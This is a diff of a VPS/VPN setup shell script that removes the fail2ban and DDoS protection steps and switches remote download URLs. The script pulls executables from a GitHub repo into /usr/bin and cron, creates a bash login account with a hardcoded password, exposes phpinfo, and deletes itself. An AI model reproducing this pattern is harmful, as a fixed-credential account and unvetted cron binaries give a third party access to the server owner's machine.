@@ -95,32 +95,28 @@ echo -e "\e[33m
    ================================================
 \e[0m" > /etc/motd
  
-# fail2ban & exim & protection
-apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
-wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
-cd ddos-deflate-master && ./install.sh
-service exim4 stop;sysv-rc-conf exim4 off 
+
 
 # nginx
 apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/aiaicip/tong8/master/script/nginx.conf"
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/aiaicip/tong/master/script/nginx.conf"
 mkdir -p /home/vps/public_html
 echo "<pre>Assalamualaikum | Setup by abangG | telegram @TogaSinki</pre>" > /home/vps/public_html/index.php
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/aiaicip/tong8/master/script/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/aiaicip/tong/master/script/vps.conf"
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/aiaicip/tong8/master/script/client.ovpn"
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/aiaicip/tong/master/script/client.ovpn"
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-cd;wget https://raw.githubusercontent.com/aiaicip/tong8/master/script/cronjob.tar
+cd;wget https://raw.githubusercontent.com/aiaicip/tong/master/script/cronjob.tar
 tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
 mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
 chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
 useradd -m -g users -s /bin/bash abangG
-echo "abangG:135135" | chpasswd
+echo "abangG:443273" | chpasswd
 echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
 rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 clear
@@ -128,13 +124,10 @@ clear
 # restart service
 service nginx restart
 service php5-fpm restart
-service fail2ban restart
+
 cd
 
-#swap ram
-wget https://raw.githubusercontent.com/aiaicip/tong8/master/script/swap-ram.sh
-chmod +x  swap-ram.sh
-./swap-ram.sh
+
 
 clear
 
